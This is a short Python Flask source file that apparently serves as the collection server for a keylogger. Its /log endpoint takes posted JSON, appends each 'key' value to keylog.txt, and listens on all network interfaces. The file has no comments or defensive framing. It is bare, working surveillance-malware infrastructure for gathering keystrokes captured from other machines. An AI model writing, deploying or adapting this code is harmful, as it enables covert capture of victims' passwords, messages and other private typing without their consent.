from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_key():
    data = request.get_json()
    if 'key' in data:
        with open('keylog.txt', 'a') as log:
            log.write(data['key'] + '\n')
    return '', 204  

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
